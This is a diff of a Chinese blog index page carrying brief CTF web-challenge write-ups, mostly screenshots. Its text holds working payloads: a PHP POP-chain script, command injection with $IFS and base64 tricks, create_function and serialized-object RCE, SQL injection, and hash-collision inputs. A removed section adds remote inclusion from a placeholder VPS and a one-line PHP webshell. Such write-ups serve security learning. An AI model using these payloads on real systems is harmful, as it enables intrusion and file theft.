+<p><img src="https://img-blog.csdnimg.cn/dd3e182a82e84444bce6945e88a33e2c.png" alt="在这里插入图片描述"></p>
+<h1 id="SWPUCTF-2021-新生赛-pop"><a href="#SWPUCTF-2021-新生赛-pop" class="headerlink" title="[SWPUCTF 2021 新生赛]pop"></a>[SWPUCTF 2021 新生赛]pop</h1><pre><code class="php">
+&lt;?php
+class w44m&#123;
+
+    private $admin = &#39;aaa&#39;;
+    protected $passwd = &#39;123456&#39;;
+    public function __construct($admin,$passwd)&#123;
+        $this-&gt;admin = $admin;
+        $this-&gt;passwd = $passwd;
+    &#125;
+    public function Getflag()&#123;
+        if($this-&gt;admin === &#39;w44m&#39; &amp;&amp; $this-&gt;passwd ===&#39;08067&#39;)&#123;
+            include(&#39;flag.php&#39;);
+            echo $flag;
+        &#125;else&#123;
+            echo $this-&gt;admin;
+            echo $this-&gt;passwd;
+            echo &#39;nono&#39;;
+        &#125;
+    &#125;
+&#125;
+
+class w22m&#123;
+    public $w00m;
+    public function __destruct()&#123;
+        echo $this-&gt;w00m;
+    &#125;
+&#125;
+
+class w33m&#123;
+    public $w00m;
+    public $w22m;
+    public function __toString()&#123;
+        $this-&gt;w00m-&gt;&#123;$this-&gt;w22m&#125;();
+        return 0;
+    &#125;
+&#125;
+
+$p = new w22m();
+$w3 = new w33m();
+$p-&gt;w00m = $w3;
+$w4 = new w44m(&#39;w44m&#39;,&#39;08067&#39;);
+$w3-&gt;w00m = $w4;
+$w3-&gt;w22m = &#39;Getflag&#39;;
+echo urlencode(serialize($p)).&quot;\n&quot;;
+</code></pre>
+<p><img src="https://img-blog.csdnimg.cn/658fba11465d4d47b7f82479740e4985.png" alt="在这里插入图片描述"></p>
+<h1 id="NCTF-2018-签到题"><a href="#NCTF-2018-签到题" class="headerlink" title="[NCTF 2018]签到题"></a>[NCTF 2018]签到题</h1><p><img src="https://img-blog.csdnimg.cn/cae95c1e49a34d7e940bef9a6043b46a.png" alt="在这里插入图片描述"></p>
+<h1 id="SWPUCTF-2021-新生赛-sql"><a href="#SWPUCTF-2021-新生赛-sql" class="headerlink" title="[SWPUCTF 2021 新生赛]sql"></a>[SWPUCTF 2021 新生赛]sql</h1><p><img src="https://img-blog.csdnimg.cn/9012ebad333449e282f9b0e681ee1763.png" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/7a4fe32e2f114c6fbddad27502452c6b.png" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/26c5d320dc2647e5b60c0831324de3d8.png" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/42c38c74a0624ee38933d0457bdc3b0e.png" alt="在这里插入图片描述"></p>
+<h1 id="鹤城杯-2021-EasyP"><a href="#鹤城杯-2021-EasyP" class="headerlink" title="[鹤城杯 2021]EasyP"></a>[鹤城杯 2021]EasyP</h1><p>basename会删除文件开头的非ascii码字符<br><img src="https://img-blog.csdnimg.cn/c3ba28302d7d42629590591243878a3b.png" alt="在这里插入图片描述"></p>
+<h1 id="GXYCTF-2019-Ping-Ping-Ping"><a href="#GXYCTF-2019-Ping-Ping-Ping" class="headerlink" title="[GXYCTF 2019]Ping Ping Ping"></a>[GXYCTF 2019]Ping Ping Ping</h1><p><img src="https://img-blog.csdnimg.cn/7be56091f8324e9ba0da96b8bbbfaba5.png" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/049ac9bc40ae4de8a153f7058ea076a9.png" alt="在这里插入图片描述"><br>其它方法<br><code>?ip=;ss=g;tac$IFS$9fla$ss.php</code></p>
+<pre><code class="shell">;`echo$IFS$9dGFjICo=|base64$IFS$9-d`
+</code></pre>
+<h1 id="NSSCTF-2022-Spring-Recruit-ezgame"><a href="#NSSCTF-2022-Spring-Recruit-ezgame" class="headerlink" title="[NSSCTF 2022 Spring Recruit]ezgame"></a>[NSSCTF 2022 Spring Recruit]ezgame</h1><p><img src="https://img-blog.csdnimg.cn/e474425d517b4766bdd202bc821a3767.png" alt="在这里插入图片描述"></p>
+<h1 id="SWPUCTF-2021-新生赛-finalrce"><a href="#SWPUCTF-2021-新生赛-finalrce" class="headerlink" title="[SWPUCTF 2021 新生赛]finalrce"></a>[SWPUCTF 2021 新生赛]finalrce</h1><p><img src="https://img-blog.csdnimg.cn/98a78b6065114370807bf562e5fb85a0.png" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/a980ad34b963491384997da74c07b67b.png" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/fed5fdce5121404e9e2e356d149f28fe.png" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/37ffe615314a4207af14dd6982f000be.png" alt="在这里插入图片描述"></p>
+<h1 id="LitCTF-2023-导弹迷踪"><a href="#LitCTF-2023-导弹迷踪" class="headerlink" title="[LitCTF 2023]导弹迷踪"></a>[LitCTF 2023]导弹迷踪</h1><p><img src="https://img-blog.csdnimg.cn/0a0222862451429cb1ad295470b4598d.png" alt="在这里插入图片描述"></p>
+<h1 id="NISACTF-2022-checkin"><a href="#NISACTF-2022-checkin" class="headerlink" title="[NISACTF 2022]checkin"></a>[NISACTF 2022]checkin</h1><p><img src="https://img-blog.csdnimg.cn/b1d385f829174d9e92bf1e18fa2054ba.png" alt="在这里插入图片描述"><br>存在不可见字符 ,复制粘贴就行<br><img src="https://img-blog.csdnimg.cn/9d8f921904794059a65170b49add6e0c.png" alt="在这里插入图片描述"></p>
+<h1 id="LitCTF-2023-PHP是世界上最好的语言！！"><a href="#LitCTF-2023-PHP是世界上最好的语言！！" class="headerlink" title="[LitCTF 2023]PHP是世界上最好的语言！！"></a>[LitCTF 2023]PHP是世界上最好的语言！！</h1><p><img src="https://img-blog.csdnimg.cn/632934d96c45477899967f9ced48bea6.png" alt="在这里插入图片描述"></p>
+<h1 id="LitCTF-2023-我Flag呢？"><a href="#LitCTF-2023-我Flag呢？" class="headerlink" title="[LitCTF 2023]我Flag呢？"></a>[LitCTF 2023]我Flag呢？</h1><p><img src="https://img-blog.csdnimg.cn/f9c0e6ae883445728ce8c8fb17a3467a.png" alt="在这里插入图片描述"></p>
+<h1 id="鹏城杯-2022-简单包含"><a href="#鹏城杯-2022-简单包含" class="headerlink" title="[鹏城杯 2022]简单包含"></a>[鹏城杯 2022]简单包含</h1><p>读flag.php 有waf 读index.php<br><img src="https://img-blog.csdnimg.cn/5115a393cb2a4c318c0054177003e89d.png" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/ca83edaffa6849409f34f85a33bd8ae0.png" alt="在这里插入图片描述"></p>
+<h1 id="强网杯-2019-随便注"><a href="#强网杯-2019-随便注" class="headerlink" title="[强网杯 2019]随便注"></a>[强网杯 2019]随便注</h1><p>select给ban了 updatexml update 也给ban了<br>考虑堆叠<br><img src="https://img-blog.csdnimg.cn/0293f337fb094459ae0a89253047a31d.png" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/603f0482190949a59878c4952919fb21.png" alt="在这里插入图片描述"><br>这里set 和 prepare也ban了</p>
+<h1 id="LitCTF-2023-1zjs"><a href="#LitCTF-2023-1zjs" class="headerlink" title="[LitCTF 2023]1zjs"></a>[LitCTF 2023]1zjs</h1><p><img src="https://img-blog.csdnimg.cn/bec5ce71df4b4a1a9b80b36d4f29f9ba.png" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/ac771ae2b40f4bcaab26725baa807ac7.png" alt="在这里插入图片描述"></p>
+<h1 id="NISACTF-2022-level-up"><a href="#NISACTF-2022-level-up" class="headerlink" title="[NISACTF 2022]level-up"></a>[NISACTF 2022]level-up</h1><p>ctrl+u 有disallow 很像robots.txt<br>访问<br><img src="https://img-blog.csdnimg.cn/6615e54046a74e1fbeee522bff31e3c3.png" alt="在这里插入图片描述"></p>
+<pre><code class="bash">array1=%4d%c9%68%ff%0e%e3%5c%20%95%72%d4%77%7b%72%15%87%d3%6f%a7%b2%1b%dc%56%b7%4a%3d%c0%78%3e%7b%95%18%af%bf%a2%00%a8%28%4b%f3%6e%8e%4b%55%b3%5f%42%75%93%d8%49%67%6d%a0%d1%55%5d%83%60%fb%5f%07%fe%a2&amp;array2=%4d%c9%68%ff%0e%e3%5c%20%95%72%d4%77%7b%72%15%87%d3%6f%a7%b2%1b%dc%56%b7%4a%3d%c0%78%3e%7b%95%18%af%bf%a2%02%a8%28%4b%f3%6e%8e%4b%55%b3%5f%42%75%93%d8%49%67%6d%a0%d1%d5%5d%83%60%fb%5f%07%fe%a2
+</code></pre>
+<p><img src="https://img-blog.csdnimg.cn/6e9c1a9821094106a85431b818303631.png" alt="在这里插入图片描述"></p>
+<pre><code class="bash">array1=%25PDF-1.3%0A%25%E2%E3%CF%D3%0A%0A%0A1%200%20obj%0A%3C%3C/Width%202%200%20R/Height%203%200%20R/Type%204%200%20R/Subtype%205%200%20R/Filter%206%200%20R/ColorSpace%207%200%20R/Length%208%200%20R/BitsPerComponent%208%3E%3E%0Astream%0A%FF%D8%FF%FE%00%24SHA-1%20is%20dead%21%21%21%21%21%85/%EC%09%239u%9C9%B1%A1%C6%3CL%97%E1%FF%FE%01sF%DC%91f%B6%7E%11%8F%02%9A%B6%21%B2V%0F%F9%CAg%CC%A8%C7%F8%5B%A8Ly%03%0C%2B%3D%E2%18%F8m%B3%A9%09%01%D5%DFE%C1O%26%FE%DF%B3%DC8%E9j%C2/%E7%BDr%8F%0EE%BC%E0F%D2%3CW%0F%EB%14%13%98%BBU.%F5%A0%A8%2B%E31%FE%A4%807%B8%B5%D7%1F%0E3.%DF%93%AC5%00%EBM%DC%0D%EC%C1%A8dy%0Cx%2Cv%21V%60%DD0%97%91%D0k%D0%AF%3F%98%CD%A4%BCF%29%B1&amp;array2=%25PDF-1.3%0A%25%E2%E3%CF%D3%0A%0A%0A1%200%20obj%0A%3C%3C/Width%202%200%20R/Height%203%200%20R/Type%204%200%20R/Subtype%205%200%20R/Filter%206%200%20R/ColorSpace%207%200%20R/Length%208%200%20R/BitsPerComponent%208%3E%3E%0Astream%0A%FF%D8%FF%FE%00%24SHA-1%20is%20dead%21%21%21%21%21%85/%EC%09%239u%9C9%B1%A1%C6%3CL%97%E1%FF%FE%01%7FF%DC%93%A6%B6%7E%01%3B%02%9A%AA%1D%B2V%0BE%CAg%D6%88%C7%F8K%8CLy%1F%E0%2B%3D%F6%14%F8m%B1i%09%01%C5kE%C1S%0A%FE%DF%B7%608%E9rr/%E7%ADr%8F%0EI%04%E0F%C20W%0F%E9%D4%13%98%AB%E1.%F5%BC%94%2B%E35B%A4%80-%98%B5%D7%0F%2A3.%C3%7F%AC5%14%E7M%DC%0F%2C%C1%A8t%CD%0Cx0Z%21Vda0%97%89%60k%D0%BF%3F%98%CD%A8%04F%29%A1
+</code></pre>
+<p><img src="https://img-blog.csdnimg.cn/ee4ce74fbd05469797364c24826e2afc.png" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/fff384829bc0447b8eee4b99ad64d9dc.png" alt="在这里插入图片描述"><br>这里可以<br><code>NI+SA+=txw4ever</code><br><code>NI+SA[=txw4ever</code><br>但是<br><code>NI[SA+=txw4ever</code><br>不行 原因是在使用<code>[</code>替换<code>_</code>后,在<code>[</code>后的字符都不会替换<br><img src="https://img-blog.csdnimg.cn/5ae20c88c6a24865be8aea13b9ec7747.png" alt="在这里插入图片描述"><br><code>\create_function&amp;b=&#125;system(&#39;cat /f*&#39;);?&gt;</code></p>
+<h1 id="SWPUCTF-2022-新生赛-ez-ez-php"><a href="#SWPUCTF-2022-新生赛-ez-ez-php" class="headerlink" title="[SWPUCTF 2022 新生赛]ez_ez_php"></a>[SWPUCTF 2022 新生赛]ez_ez_php</h1><p>读flag.php知道flag在flag<br><img src="https://img-blog.csdnimg.cn/e2b173d06add47bfa33dc4d508f2c3db.png" alt="在这里插入图片描述"></p>
+<h1 id="LitCTF-2023-Ping"><a href="#LitCTF-2023-Ping" class="headerlink" title="[LitCTF 2023]Ping"></a>[LitCTF 2023]Ping</h1><p><img src="https://img-blog.csdnimg.cn/f8b8a42d052e4ac1a7863b80d8e9a0c5.png" alt="在这里插入图片描述"></p>
+<h1 id="CISCN-2019华东南-Web11"><a href="#CISCN-2019华东南-Web11" class="headerlink" title="[CISCN 2019华东南]Web11"></a>[CISCN 2019华东南]Web11<img src="https://img-blog.csdnimg.cn/8d86c5a4766b4af69d09257f1775ba07.png" alt="在这里插入图片描述"></h1><p>Smarty ssti<br><img src="https://img-blog.csdnimg.cn/d366ad7be9de4f8a869b17a2d056c683.png" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/6712280decd54bf39c145ca32bfecd32.png" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/280f83e9a9814b5e8cf35d906e4b5c90.png" alt="在这里插入图片描述"></p>
+<h1 id="UUCTF-2022-新生赛-websign"><a href="#UUCTF-2022-新生赛-websign" class="headerlink" title="[UUCTF 2022 新生赛]websign"></a>[UUCTF 2022 新生赛]websign</h1><p>view-source:</p>
+<h1 id="NISACTF-2022-babyupload"><a href="#NISACTF-2022-babyupload" class="headerlink" title="[NISACTF 2022]babyupload"></a>[NISACTF 2022]babyupload</h1><p>过滤了<code>.</code>不知道怎么搞了,回去ctrl+u 给了源码<br><img src="https://img-blog.csdnimg.cn/7ef246dc65fc4fb38ee4bd414b8285c0.png" alt="在这里插入图片描述"><br>这里可以直接读flag<br>传的文件名为<code>/flag</code>在os.path.join的时候因为有<code>/</code>所以path变成<code>/flag</code><br><img src="https://img-blog.csdnimg.cn/70de7700e5e34655868171da5eed291c.png" alt="在这里插入图片描述"></p>
+<h1 id="HUBUCTF-2022-新生赛-checkin"><a href="#HUBUCTF-2022-新生赛-checkin" class="headerlink" title="[HUBUCTF 2022 新生赛]checkin"></a>[HUBUCTF 2022 新生赛]checkin</h1><p><img src="https://img-blog.csdnimg.cn/1038b682eebc4868ae871626b683afda.png" alt="在这里插入图片描述"></p>
+<h1 id="LitCTF-2023-Follow-me-and-hack-me"><a href="#LitCTF-2023-Follow-me-and-hack-me" class="headerlink" title="[LitCTF 2023]Follow me and hack me"></a>[LitCTF 2023]Follow me and hack me<img src="https://img-blog.csdnimg.cn/27d2231df68f459ea994e2d30e36066a.png" alt="在这里插入图片描述"></h1><h1 id="GDOUCTF-2023-hate-eat-snake"><a href="#GDOUCTF-2023-hate-eat-snake" class="headerlink" title="[GDOUCTF 2023]hate eat snake"></a>[GDOUCTF 2023]hate eat snake</h1><p>开着f12进<br><img src="https://img-blog.csdnimg.cn/f9380decbc89415583bb8ba100d27a28.png" alt="在这里插入图片描述"><br><code>Snake.prototype.getScore = function () &#123; return 100 &#125;</code><br>我有点不能理解为什么要用原型,没学过js 有空把node学了,应该大同小异<br>当初做的时候是改的判断条件<br><img src="https://img-blog.csdnimg.cn/72fae775327d44839580aa2fb16d3680.png" alt="在这里插入图片描述"><br>node早晚要学,java结束一定学()</p>
+<h1 id="LitCTF-2023-作业管理系统"><a href="#LitCTF-2023-作业管理系统" class="headerlink" title="[LitCTF 2023]作业管理系统"></a>[LitCTF 2023]作业管理系统</h1><p>弱口令 admin admin<br>文件上传无过滤</p>
+<h1 id="NISACTF-2022-babyserialize"><a href="#NISACTF-2022-babyserialize" class="headerlink" title="[NISACTF 2022]babyserialize"></a>[NISACTF 2022]babyserialize</h1><p>hint说flag在根目录下<br>试了一下反引号 system shell_exec file_get_contents $_GET[1]之类的 都给ban了<br>看wp才知道大小写就能绕</p>
+<p><img src="https://img-blog.csdnimg.cn/568bc3c6476649748e41ffcc04761cd7.png" alt="在这里插入图片描述"><br><code>O:4:&quot;NISA&quot;:2:&#123;s:3:&quot;fun&quot;;O:8:&quot;Ilovetxw&quot;:2:&#123;s:5:&quot;huang&quot;;N;s:2:&quot;su&quot;;r:1;&#125;s:8:&quot;txw4ever&quot;;s:27:&quot;SyStem(&#39;cat /fllllllaaag&#39;);&quot;;&#125;</code></p>
+<h1 id="NISACTF-2022-bingdundun"><a href="#NISACTF-2022-bingdundun" class="headerlink" title="[NISACTF 2022]bingdundun~"></a>[NISACTF 2022]bingdundun~</h1>
+            
+        </div>
+    </div>
+    <div class="post-tags">
+        
+        <span class="icon">
+            <i class="fa-solid fa-tags fa-fw"></i>
+        </span>
+        
+        
+        
+        <span class="tag">
+            
+            <a href="/tags/python/" style="color: #00bcd4">python</a>
+        </span>
+        
+        <span class="tag">
+            
+            <a href="/tags/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/" style="color: #03a9f4">网络安全</a>
+        </span>
+        
+        <span class="tag">
+            
+            <a href="/tags/%E5%AE%89%E5%85%A8/" style="color: #00a596">安全</a>
+        </span>
+        
+        <span class="tag">
+            
+            <a href="/tags/%E5%89%8D%E7%AB%AF/" style="color: #00bcd4">前端</a>
+        </span>
+        
+    </div>
+    <a href="/2023/06/19/NSS%E5%88%B7web(1)/" class="go-post">阅读全文</a>
+</div>
+
+<div class="post">
     <a href="/2023/06/10/NSS%E5%91%A8%E5%B8%B8%E5%88%B7%E5%AF%86%E7%A0%81(3)/">
         <h2 class="post-title">NSS周常刷密码(3)</h2>
     </a>
@@ -444,7 +908,7 @@ print(long_to_bytes(m))
         
         <span class="tag">
             
-            <a href="/tags/%E6%95%B0%E5%AD%A6%E5%BB%BA%E6%A8%A1/" style="color: #ff7d73">数学建模</a>
+            <a href="/tags/%E6%95%B0%E5%AD%A6%E5%BB%BA%E6%A8%A1/" style="color: #ffa2c4">数学建模</a>
         </span>
         
     </div>
@@ -555,12 +1019,12 @@ print(long_to_bytes(pow(c,d,n)))
         
         <span class="tag">
             
-            <a href="/tags/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/" style="color: #ff7d73">网络安全</a>
+            <a href="/tags/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/" style="color: #00a596">网络安全</a>
         </span>
         
         <span class="tag">
             
-            <a href="/tags/%E6%95%B0%E5%AD%A6%E5%BB%BA%E6%A8%A1/" style="color: #ffa2c4">数学建模</a>
+            <a href="/tags/%E6%95%B0%E5%AD%A6%E5%BB%BA%E6%A8%A1/" style="color: #ff7d73">数学建模</a>
         </span>
         
         <span class="tag">
@@ -616,7 +1080,7 @@ print(long_to_bytes(pow(c,d,n)))
         
         <span class="tag">
             
-            <a href="/tags/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/" style="color: #00bcd4">网络安全</a>
+            <a href="/tags/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/" style="color: #ffa2c4">网络安全</a>
         </span>
         
     </div>
@@ -914,22 +1378,22 @@ print(long_to_bytes(pow(c,d,n)))
         
         <span class="tag">
             
-            <a href="/tags/python/" style="color: #00a596">python</a>
+            <a href="/tags/python/" style="color: #03a9f4">python</a>
         </span>
         
         <span class="tag">
             
-            <a href="/tags/%E5%BC%80%E5%8F%91%E8%AF%AD%E8%A8%80/" style="color: #03a9f4">开发语言</a>
+            <a href="/tags/%E5%BC%80%E5%8F%91%E8%AF%AD%E8%A8%80/" style="color: #00bcd4">开发语言</a>
         </span>
         
         <span class="tag">
             
-            <a href="/tags/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/" style="color: #00bcd4">网络安全</a>
+            <a href="/tags/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/" style="color: #03a9f4">网络安全</a>
         </span>
         
         <span class="tag">
             
-            <a href="/tags/%E5%AE%89%E5%85%A8/" style="color: #00a596">安全</a>
+            <a href="/tags/%E5%AE%89%E5%85%A8/" style="color: #ff7d73">安全</a>
         </span>
         
     </div>
@@ -1023,12 +1487,12 @@ print(long_to_bytes(pow(c,d,a*g)))
         
         <span class="tag">
             
-            <a href="/tags/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/" style="color: #ff7d73">网络安全</a>
+            <a href="/tags/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/" style="color: #00bcd4">网络安全</a>
         </span>
         
         <span class="tag">
             
-            <a href="/tags/%E6%95%B0%E5%AD%A6%E5%BB%BA%E6%A8%A1/" style="color: #ffa2c4">数学建模</a>
+            <a href="/tags/%E6%95%B0%E5%AD%A6%E5%BB%BA%E6%A8%A1/" style="color: #03a9f4">数学建模</a>
         </span>
         
     </div>
@@ -1196,27 +1660,27 @@ print(hashlib.md5(flag.encode(&quot;utf-8&quot;)).hexdigest())
         
         <span class="tag">
             
-            <a href="/tags/%E5%BC%80%E5%8F%91%E8%AF%AD%E8%A8%80/" style="color: #00a596">开发语言</a>
+            <a href="/tags/%E5%BC%80%E5%8F%91%E8%AF%AD%E8%A8%80/" style="color: #ffa2c4">开发语言</a>
         </span>
         
         <span class="tag">
             
-            <a href="/tags/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/" style="color: #03a9f4">网络安全</a>
+            <a href="/tags/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/" style="color: #00a596">网络安全</a>
         </span>
         
         <span class="tag">
             
-            <a href="/tags/%E6%95%B0%E5%AD%A6%E5%BB%BA%E6%A8%A1/" style="color: #00bcd4">数学建模</a>
+            <a href="/tags/%E6%95%B0%E5%AD%A6%E5%BB%BA%E6%A8%A1/" style="color: #03a9f4">数学建模</a>
         </span>
         
         <span class="tag">
             
-            <a href="/tags/php/" style="color: #00a596">php</a>
+            <a href="/tags/php/" style="color: #00bcd4">php</a>
         </span>
         
         <span class="tag">
             
-            <a href="/tags/linux/" style="color: #00bcd4">linux</a>
+            <a href="/tags/linux/" style="color: #03a9f4">linux</a>
         </span>
         
     </div>
@@ -1493,17 +1957,17 @@ print(long_to_bytes(pow(c,d,n)))
         
         <span class="tag">
             
-            <a href="/tags/python/" style="color: #ff7d73">python</a>
+            <a href="/tags/python/" style="color: #00a596">python</a>
         </span>
         
         <span class="tag">
             
-            <a href="/tags/java/" style="color: #ffa2c4">java</a>
+            <a href="/tags/java/" style="color: #00bcd4">java</a>
         </span>
         
         <span class="tag">
             
-            <a href="/tags/javascript/" style="color: #00bcd4">javascript</a>
+            <a href="/tags/javascript/" style="color: #00a596">javascript</a>
         </span>
         
     </div>
@@ -1898,66 +2362,8 @@ print(flag)
         
         <span class="tag">
             
-            <a href="/tags/%E5%BC%80%E5%8F%91%E8%AF%AD%E8%A8%80/" style="color: #03a9f4">开发语言</a>
+            <a href="/tags/%E5%BC%80%E5%8F%91%E8%AF%AD%E8%A8%80/" style="color: #ffa2c4">开发语言</a>
         </span>
-        
-        <span class="tag">
-            
-            <a href="/tags/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/" style="color: #00a596">网络安全</a>
-        </span>
-        
-        <span class="tag">
-            
-            <a href="/tags/php/" style="color: #ffa2c4">php</a>
-        </span>
-        
-        <span class="tag">
-            
-            <a href="/tags/linux/" style="color: #00bcd4">linux</a>
-        </span>
-        
-    </div>
-    <a href="/2023/05/16/2023%E5%AE%81%E6%B3%A2%E5%B8%82%E8%B5%9B%20%E5%A4%A9%E4%B8%80%E6%B0%B8%E5%AE%89%E6%9D%AF%E8%B5%9B%E5%89%8D%E6%A8%A1%E6%8B%9F%E9%A2%98%E9%83%A8%E5%88%86wp/" class="go-post">阅读全文</a>
-</div>
-
-<div class="post">
-    <a href="/2023/05/14/CTFSHOW%E5%91%A8%E6%9C%AB%E5%A4%A7%E6%8C%91%E6%88%98wp/">
-        <h2 class="post-title">CTFSHOW周末大挑战wp</h2>
-    </a>
-    <div class="category-and-date">
-        
-        <span class="date">
-            <span class="icon">
-                <i class="fa-solid fa-calendar fa-fw"></i>
-            </span>
-            2023/5/14
-        </span>
-        
-        
-    </div>
-    <div class="description">
-        <div class="content" v-pre>
-            
-            <h1 id="1"><a href="#1" class="headerlink" title="1"></a>1</h1><p>挺麻烦的是 &#x2F;不能写,会截断解析,这里我用了base64解码后再运行<br>做到4的时候才想起来可以直接cd</p>
-<pre><code class="bash">?u=http://system(&quot;`echo%20%27Y2F0IC9mbGFnX2lzX2hlcmUudHh0%27|base64%20-d`&quot;);:
-</code></pre>
-<h1 id="2"><a href="#2" class="headerlink" title="2"></a>2</h1><p>远程包含vps上的一句话<br><code>?u=username:http://vps地址/x.php</code></p>
-<h1 id="3"><a href="#3" class="headerlink" title="3"></a>3</h1><p>还是远程vps<br><code>/?u=http:://vps地址/x.php</code></p>
-<h1 id="4"><a href="#4" class="headerlink" title="4"></a>4</h1><p>cd 后再读取<br><code>?u=http://cd ..%26%26cd ..%26%26cd ..%26%26tac 1_f1ag_1s_h3re</code></p>
-<h1 id="5"><a href="#5" class="headerlink" title="5"></a>5</h1><p><code>?u=user://pass:fragment@scheme:9090/path?http://vps地址/x.php%23query</code><br>构造流程如下<br><img src="https://img-blog.csdnimg.cn/5fece1ceebbf4245b5637547e2bd84d3.png" alt="在这里插入图片描述"></p>
-<h1 id="6"><a href="#6" class="headerlink" title="6"></a>6</h1><p>一开始想用伪协议,然后base64-decode写马<br>然后发现path无论如何都会以&#x2F;开头,伪协议用不了<br>要 直接写马又不能有<code>?</code><br>没想到版本是5.几的<br><code>&lt;script language=&quot;php&quot;&gt;</code>还能用</p>
-<p><code>//&lt;script language=&quot;php&quot;&gt;eval($_POST[1]);:/var/www/html/shell.php</code></p>
-
-            
-        </div>
-    </div>
-    <div class="post-tags">
-        
-        <span class="icon">
-            <i class="fa-solid fa-tags fa-fw"></i>
-        </span>
-        
-        
         
         <span class="tag">
             
@@ -1966,498 +2372,16 @@ print(flag)
         
         <span class="tag">
             
-            <a href="/tags/php/" style="color: #ffa2c4">php</a>
+            <a href="/tags/php/" style="color: #00a596">php</a>
         </span>
         
         <span class="tag">
             
-            <a href="/tags/linux/" style="color: #00bcd4">linux</a>
-        </span>
-        
-        <span class="tag">
-            
-            <a href="/tags/%E8%BF%90%E7%BB%B4/" style="color: #00a596">运维</a>
-        </span>
-        
-        <span class="tag">
-            
-            <a href="/tags/%E6%9C%8D%E5%8A%A1%E5%99%A8/" style="color: #00bcd4">服务器</a>
+            <a href="/tags/linux/" style="color: #ff7d73">linux</a>
         </span>
         
     </div>
-    <a href="/2023/05/14/CTFSHOW%E5%91%A8%E6%9C%AB%E5%A4%A7%E6%8C%91%E6%88%98wp/" class="go-post">阅读全文</a>
-</div>
-
-<div class="post">
-    <a href="/2023/05/14/LITCTF2023%20%E9%83%A8%E5%88%86WP/">
-        <h2 class="post-title">LITCTF2023 部分WP</h2>
-    </a>
-    <div class="category-and-date">
-        
-        <span class="date">
-            <span class="icon">
-                <i class="fa-solid fa-calendar fa-fw"></i>
-            </span>
-            2023/5/14
-        </span>
-        
-        
-    </div>
-    <div class="description">
-        <div class="content" v-pre>
-            
-            <h1 id="WEB"><a href="#WEB" class="headerlink" title="WEB"></a>WEB</h1><h2 id="我Flag呢？"><a href="#我Flag呢？" class="headerlink" title="我Flag呢？"></a>我Flag呢？</h2><p>查看源码就有flag了<br><img src="https://img-blog.csdnimg.cn/8317353a125941adb692c1dbd7ca0efc.png" alt="在这里插入图片描述"><br>彩蛋</p>
-<h2 id="导弹迷踪"><a href="#导弹迷踪" class="headerlink" title="导弹迷踪"></a>导弹迷踪</h2><p><img src="https://img-blog.csdnimg.cn/5138b92792aa4a399ec95505e7619bb6.png" alt="在这里插入图片描述"></p>
-<h2 id="Follow-me-and-hack-me"><a href="#Follow-me-and-hack-me" class="headerlink" title="Follow me and hack me"></a>Follow me and hack me</h2><p><img src="https://img-blog.csdnimg.cn/148ac39fa59142c0b415bc6b042a4d61.png" alt="在这里插入图片描述"></p>
-<p>然后彩蛋<a target="_blank" rel="noopener" href="http://www.zip解压即可/">www.zip解压即可</a></p>
-<h2 id="PHP是世界上最好的语言！！"><a href="#PHP是世界上最好的语言！！" class="headerlink" title="PHP是世界上最好的语言！！"></a>PHP是世界上最好的语言！！</h2><p>直接可以命令执行,当时想了好久<br><img src="https://img-blog.csdnimg.cn/28de1607a2114f37a7346e96312a524e.png" alt="在这里插入图片描述"></p>
-<h2 id="Vim-yyds"><a href="#Vim-yyds" class="headerlink" title="Vim yyds"></a>Vim yyds</h2><p>扫目录,有swp文件<br><img src="https://img-blog.csdnimg.cn/154d649914724574a6b43e6dc6c13cfb.png" alt="然后按提示"><br><img src="https://img-blog.csdnimg.cn/824b7d621e8042839de4097263e7bcc1.png" alt="在这里插入图片描述"></p>
-<h2 id="作业管理系统"><a href="#作业管理系统" class="headerlink" title="作业管理系统"></a>作业管理系统</h2><p>任意文件上传,传个马访问就行<br>彩蛋<br><img src="https://img-blog.csdnimg.cn/5dab43517cc140a89d22450d33af1128.png" alt="在这里插入图片描述"><img src="https://img-blog.csdnimg.cn/742db4ff29854a77892ad057de908b40.png" alt="在这里插入图片描述"></p>
-<h2 id="这是什么？SQL-！注一下-！"><a href="#这是什么？SQL-！注一下-！" class="headerlink" title="这是什么？SQL ！注一下 ！"></a>这是什么？SQL ！注一下 ！</h2><p><code>?id=1))))))union select version(),group_concat(flag)from ctftraining.flag%23</code><br>彩蛋输入2<br>这彩蛋是难找</p>
-<h2 id="Http-pro-max-plus"><a href="#Http-pro-max-plus" class="headerlink" title="Http pro max plus"></a>Http pro max plus</h2><p><img src="https://img-blog.csdnimg.cn/66becfa08e0b41f9a7d5752caae3e9cb.png" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/3ba8a2c37c5e45958ba0f6674bf186c8.png" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/d12fa5f1d45546638ed67213cb168548.png" alt="在这里插入图片描述"></p>
-<h2 id="Ping"><a href="#Ping" class="headerlink" title="Ping"></a>Ping</h2><p><img src="https://img-blog.csdnimg.cn/1987fd51940b4ffdae6dda007aca89c6.png" alt="在这里插入图片描述"></p>
